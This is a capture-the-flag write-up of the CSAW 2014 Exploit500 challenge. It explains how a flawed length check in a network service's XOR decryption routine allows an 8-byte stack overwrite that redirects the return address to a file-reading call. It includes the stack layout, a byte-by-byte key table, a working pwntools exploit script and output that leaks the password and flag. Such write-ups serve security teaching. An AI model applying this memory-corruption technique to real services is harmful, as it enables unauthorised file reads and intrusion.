The [CSAW 2014](https://ctftime.org/event/152/tasks/) Exploit500 challenge was a Linux 32-bit network service for which the executable
and the source code were provided (I saved a copy of the source code [here](https://github.com/ekse/code/blob/master/ctf/csaw2014/exploit500/xorcise.c)).
The service accepts packets defined by the structure cipher_data and first applies a decryption loop to the received data.

```c
struct cipher_data
{
    uint8_t length;
    uint8_t key[8];
    uint8_t bytes[128];
};
typedef struct cipher_data cipher_data;
```

The service provides multiple commands, however the 2 interesting ones `read_file` and `system` require your packet to be authenticated.
The authentication verification is done in `is_authenticated()` and computes an authentication checksum based on a password read from
the local file 'password.txt'. This check does not seem to be vulnerable.

My teammate EiNSTeiN_ discovered that there is a flaw in the `decipher()` method that does the decryption of the data. The function
allocates a buffer `buf` which will contain the decrypted data, the allocated size is `MAX_BLOCKS * BLOCK_SIZE` which is 128 bytes. The
copy of the packet bytes to the buffer is done safely with memcpy.

```c
#define BLOCK_SIZE 8
#define MAX_BLOCKS 16
[...]
memcpy(buf, data->bytes, sizeof(buf));
```

There is also a check to ensure that the decryption loop does not process more than the size of `buf[]`.

```c
if ((data->length / BLOCK_SIZE) > MAX_BLOCKS)
{
    data->length = BLOCK_SIZE * MAX_BLOCKS;
}
```

But this check is flawed because of rounding; we can pass a value of 135 which will pass the check (135 / 8 equals 16 which is not bigger than `MAX_BLOCKS`).
The decryption loop is applied by blocks of 8 bytes, so we are able to apply it to 8 bytes outside the bounds of `buf[]`.

```c
for (loop = 0; loop < data->length; loop += 8)
{
    for (block_index = 0; block_index < 8; ++block_index)
    {
        buf[loop+block_index] ^= (xor_mask^data->key[block_index]);
    }
}
```

If we look at the stack layout of `decipher()` we see that those 8 bytes are the variables `xor_mask`, `block_index` and the first 3 bytes
of loop.

```
-00000095 buf             db 128 dup(?)
-00000015 xor_mask        db ?
-00000014 block_index     dd ?
-00000010 loop            dd ?
```

## Exploitation Strategy

The strategy I went for is to modify the value of `loop` to make it point on the return address of `decipher()` and modify its 2 first bytes
to make it return somewhere else. Hopefully we can find an interesting place to jump to.

Let's go through the modification of the bytes one at a time. The first one is `xor_mask`. At this point `block_index` equals 0. We know 2
of the values in the decryption (`xor_mask` = 0x8F and `buf[loop+block_index]` = 0x8F), so we can set `key[block_index]` to get the output
value we want. Let's set `xor_mask` to 0 to make the next steps easier. `0x8F ^ 0x8F ^ 0x00` equals 0x00, so this is the value we will put
at `key[0]`.

```
variable: prev_val   block_index  new_val key_value
xor_mask: 0x8F       0            0x00    key[0] = 0x00
```

Next up is the first byte of `block_index`, at this point it is equal to 1. We will keep its value at 1 so the decryption loop continues
normally. As we have modified `xor_mask` to 0x00, the computation is now `0x01 ^ 0x01 ^ 0x00` which equals 0x00, we put this value in
`key[1]`. We will also leave the other bytes of `block_index` unchanged. Here is the updated table:

```
variable       : prev_val   block_index  new_val key_value
xor_mask       : 0x8F       0            0x00    key[0] = 0x00
block_index[0] : 0x01       1            0x01    key[1] = 0x00
block_index[1] : 0x00       2            0x00    key[2] = 0x00
block_index[2] : 0x00       3            0x00    key[3] = 0x00
block_index[3] : 0x00       4            0x00    key[4] = 0x00
```

We can now modify the first byte of `loop`. Its current value is 0x80 (128), the value we need to make `buf[loop+block_index]` modify the
return address at this point is 0x93, so that will give us `key[5] = 0x13`.

```
variable: prev_val   block_index  new_val key_value
loop[0] : 0x80       5            0x93    key[5] = 0x13
```

We are now able to modify the return address of `decipher()`, we're making good progress. So where do we want to make the program jump?
There is a call to `read_file()` in `process_connection()`, this command reads the content of a file and sends its content back to us,
we could use it to read the content of 'password.txt'.

```
.text:08049279                 mov     eax, [ebp+var_10]
.text:0804927C                 add     eax, 8
.text:0804927F                 sub     esp, 8
.text:08049282                 push    eax
.text:08049283                 push    offset aReadFileReques ; "Read File Request: %s\n"
.text:08049288                 call    _printf
.text:0804928D                 add     esp, 10h
.text:08049290                 mov     eax, [ebp+var_10]
.text:08049293                 add     eax, 8
.text:08049296                 sub     esp, 8
.text:08049299                 push    eax             ; filename
.text:0804929A                 push    [ebp+fd]        ; fd
.text:0804929D                 call    read_file
```

There is a little detail to keep in mind, there is a stack adjustment after the call to `decipher()`. As we are hijacking the return address
the stack will not be properly readjusted.

```
.text:0804918F                 call    decipher
.text:08049194                 add     esp, 10h
;274     packet = (request *)&decrypted;
.text:08049197                 lea     eax, [ebp+var_11D]
.text:0804919D                 mov     [ebp+var_10], eax
```

My first thought was to jump at `0x0804928D` which does the same stack adjustment and then sets the correct parameters for the call to
`read_file()`. However this approach does not work as the value of `var_10` is set only after the call to `decipher()`. Bummer.

I then noticed that the address of `filename` is passed via eax at `0x08049299` and by luck at the end of `decipher()` eax points inside `buf[]`. So the last thing I needed to do was to adjust the initial packet content so that it contained `password.txt\x00' XOR 0x8F XOR the key`. Here is the final content of the variable smashing table.

```
variable       : prev_val   block_index  new_val key_value
xor_mask       : 0x8F       0            0x00    key[0] = 0x00
block_index[0] : 0x01       1            0x01    key[1] = 0x00
block_index[1] : 0x00       2            0x00    key[2] = 0x00
block_index[2] : 0x00       3            0x00    key[3] = 0x00
block_index[3] : 0x00       4            0x00    key[4] = 0x00
loop[0]        : 0x80       5            0x93    key[5] = 0x13
at this point buf[loop+block_index] overwrites retaddr
retaddr[1]     : 0x94       6            0x99    key[6] = 0x0d
retaddr[2]     : 0x91       7            0x92    key[7] = 0x03
```

## Putting it all together

Below is the source code of my exploit, I used the [pwntools](https://github.com/Gallopsled/pwntools) python library by Gallopsled which
saved me a ton of time, definitely check it out.

```python
from pwn import *
#sock = remote("127.0.0.1", 24001)
sock = remote("128.238.66.227", 24001)
key = "\x00\x00\x00\x00\x00\x13\x0d\x03"
packet  = ""
packet += chr(135) # cipher_data.length = 135
packet += key # key
packet += "A"
#packet += xor(xor("password.txt\x00", "\x00\x00\x00\x00\x13\x0d\x03\x00"), 0x8f)
packet += xor(xor("flag.txt\x00", "\x00\x00\x00\x00\x13\x0d\x03\x00"), 0x8f)
packet += "A"* (140 - len(packet))
sock.send(packet)
sock.interactive()
```

And finally the exploit in action :

```
[ekse@xubuntu] : ~/csaw/exploit500 $ python client.py
[+] Opening connection to 127.0.0.1 on port 24001: OK
[*] Switching to interactive mode
pass123
[*] Got EOF while reading in interactive
```

So the password was 'pass123'. It was kind of depressing to have worked so much for such a weaksauce password, the CSAW CTF organizers
really are a bunch of trolls. Now we could implement the packet authentication and call the system command to list the files on the server,
 but I guessed the flag was probably in 'flag.txt' and used the exploit to read that file instead :-)

The flag was `flag{code_exec>=crypto_break}`.

Thanks to drraid for this great challenge and to the CSAW organizers for such a great CTF!
